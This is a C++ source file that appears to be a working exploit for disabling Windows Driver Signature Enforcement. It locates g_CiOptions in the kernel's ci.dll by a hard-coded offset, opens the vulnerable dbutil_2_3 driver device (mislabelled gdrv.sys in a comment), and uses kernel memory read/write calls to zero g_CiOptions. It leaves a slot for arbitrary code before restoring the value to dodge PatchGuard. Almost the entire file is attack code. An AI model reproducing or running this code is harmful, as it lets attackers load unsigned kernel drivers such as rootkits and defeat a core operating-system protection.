#include "includes.h"
#include "loader.h"


// bool MapCiDllToMemory(const std::wstring& path, LPVOID& mappedBase);
// uintptr_t HdnGetProcAddress(LPVOID mappedBase, const std::wstring& funcName);
// LPVOID HdnGetModuleBase(const std::wstring& moduleName); // for usermode modules
// uintptr_t GetCiDllKernelBase(); // for kernel base address retrieval

int main() {
    void* mappedBase = nullptr;
    std::wstring ciPath = L"C:\\Windows\\System32\\ci.dll";

    // Step 1: Map ci.dll file into memory
    if ( !loader::MapCiDllToMemory( ciPath, mappedBase ) ) {
        std::cerr << "[-] ci.dll mapping failed." << std::endl;
        system( "pause" );
        return 1;
    }

    // Parse headers from mapped image
    auto dos = reinterpret_cast< PIMAGE_DOS_HEADER >( mappedBase );
    if ( dos->e_magic != IMAGE_DOS_SIGNATURE ) {
        std::cerr << "[-] Invalid DOS signature." << std::endl;
        UnmapViewOfFile( mappedBase );
        system( "pause" );
        return 1;
    }

    auto nt = reinterpret_cast< PIMAGE_NT_HEADERS >(
        reinterpret_cast< BYTE* >( mappedBase ) + dos->e_lfanew );
    if ( nt->Signature != IMAGE_NT_SIGNATURE ) {
        std::cerr << "[-] Invalid NT signature." << std::endl;
        UnmapViewOfFile( mappedBase );
        system( "pause" );
        return 1;
    }

    std::wcout << L"[+] Entry point RVA: 0x" << std::hex
        << nt->OptionalHeader.AddressOfEntryPoint << std::endl;

    // Step 1b: Get export address RVA of CiValidateImageHeader
    uintptr_t exportRva = loader::HdnGetProcAddress( mappedBase, L"CiValidateImageHeader" );
    if ( exportRva == 0 ) {
        std::wcout << L"[-] CiValidateImageHeader not found in export table." << std::endl;
        UnmapViewOfFile( mappedBase );
        system( "pause" );
        return 1;
    }
    std::wcout << L"[+] CiValidateImageHeader RVA: 0x" << std::hex << exportRva << std::endl;

    // Step 2: Get kernel mode ci.dll base address (Ci! base)
    uintptr_t kernelCiBase = loader::GetCiDllKernelBase();
    if ( kernelCiBase == 0 ) {
        std::cerr << "[-] Failed to find kernel ci.dll base address." << std::endl;
        UnmapViewOfFile( mappedBase );
        system( "pause" );
        return 1;
    }
    std::wcout << L"[+] Kernel-mode ci.dll base: 0x" << std::hex << kernelCiBase << std::endl;

    // Step 3: Get CiInitialize RVA and VA
    uintptr_t CiInitRVA = loader::HdnGetProcAddress( mappedBase, L"CiInitialize" );
    if ( CiInitRVA ) {
        std::wcout << L"[+] CiInitialize RVA: 0x" << std::hex << CiInitRVA << std::endl;
        std::wcout << L"[+] CiInitialize VA (userland mapped): 0x" << std::hex
            << ( reinterpret_cast< uintptr_t >( mappedBase ) + CiInitRVA ) << std::endl;
    }

    // Step 4: Find g_CiOptions runtime address using known fixed offset
    uintptr_t g_CiOptionsAddr = loader::FindCiOptions( mappedBase, kernelCiBase );
    if ( g_CiOptionsAddr != 0 ) {
        std::wcout << L"[+] g_CiOptions runtime kernel VA: 0x" << std::hex << g_CiOptionsAddr << std::endl;
    }
    else {
        std::wcout << L"[-] Failed to find g_CiOptions." << std::endl;
    }

    // Cleanup
    UnmapViewOfFile( mappedBase );

    HANDLE hDevice = CreateFileW(
        L"\\\\.\\dbutil_2_3",                    // Device name for gdrv.sys vulnerable driver
        GENERIC_READ | GENERIC_WRITE,
        0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr
    );

    if ( hDevice == INVALID_HANDLE_VALUE ) {
        std::cerr << "[-] Failed to open gdrv device." << std::endl;
        system( "pause" );
        return 1;
    }

    // Read current g_CiOptions value to save old state
    uint32_t oldCiOptions = 0;
    if ( !vul::ReadKernelMemory( hDevice, g_CiOptionsAddr, &oldCiOptions, sizeof( oldCiOptions ) ) ) {
        std::cerr << "[-] Failed to read g_CiOptions from kernel memory." << std::endl;
        CloseHandle( hDevice );
        system( "pause" );
        return 1;
    }
    std::cout << "[+] Original g_CiOptions: 0x" << std::hex << oldCiOptions << std::endl;

    // New value to disable DSE
    uint32_t newCiOptions = 0x0;

    // Write new value to disable DSE
    if ( !vul::WriteKernelMemory( hDevice, g_CiOptionsAddr, &newCiOptions, sizeof( newCiOptions ) ) ) {
        std::cerr << "[-] Failed to write new g_CiOptions value." << std::endl;
        CloseHandle( hDevice );
        system( "pause" );
        return 1;
    }
    std::cout << "[+] Disabled DSE (wrote 0x0 to g_CiOptions)" << std::endl;

    // Your code here: do what you need with DSE disabled

    // IMPORTANT: Restore old g_CiOptions to avoid PatchGuard BSOD
    if ( !vul::WriteKernelMemory( hDevice, g_CiOptionsAddr, &oldCiOptions, sizeof( oldCiOptions ) ) ) {
        std::cerr << "[-] Failed to restore original g_CiOptions value." << std::endl;
        CloseHandle( hDevice );
        system( "pause" );
        return 1;
    }
    std::cout << "[+] Restored original g_CiOptions value: 0x" << std::hex << oldCiOptions << std::endl;

    CloseHandle( hDevice );
    std::cout << "[+] Done." << std::endl;
    system( "pause" );
    return 0;
}



uintptr_t loader::FindCiOptions( LPVOID mappedCiDll, uintptr_t kernelBase ) {
    // Fixed offset of g_CiOptions inside ci.dll image
    uintptr_t MappedCiOptions = 0x2a308; // offset of g_CiOptions inside the mapped image

    // Calculate runtime kernel address of g_CiOptions
    uintptr_t gCiOptionsAddress = kernelBase + MappedCiOptions;

    std::cout << "[+] g_CiOptions offset stored in MappedCiOptions: 0x"
        << std::hex << MappedCiOptions << std::endl;

    std::cout << "[+] Calculated gCiOptions runtime kernel address: 0x"
        << std::hex << gCiOptionsAddress << std::endl;

    return gCiOptionsAddress;
}